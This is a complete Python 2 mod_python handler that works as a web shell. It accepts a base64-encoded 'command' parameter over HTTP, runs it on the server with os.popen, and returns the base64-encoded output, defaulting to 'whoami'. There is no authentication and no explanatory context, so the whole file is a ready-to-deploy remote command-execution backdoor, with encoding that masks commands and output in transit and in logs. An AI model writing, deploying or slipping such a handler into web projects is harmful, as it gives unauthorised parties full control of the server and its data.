import os
import base64
from mod_python import apache, util

API_DEFAULTCOMMAND = 'whoami'

def main(req):
	command = False
	
	try:
		if req.method.upper() == 'POST':
			command = req.form.getfirst('command')
		else:
			form = util.FieldStorage(req, keep_blank_values=1)
			command = form['command']
	except Exception,e:
		output = str(e)
	
	if not command:
		command = base64.b64encode(API_DEFAULTCOMMAND)
	
	try:
		command = base64.b64decode(command)
		output = os.popen(command).read()
	except Exception,e:
		output = str(e)
	
	return base64.b64encode(output)
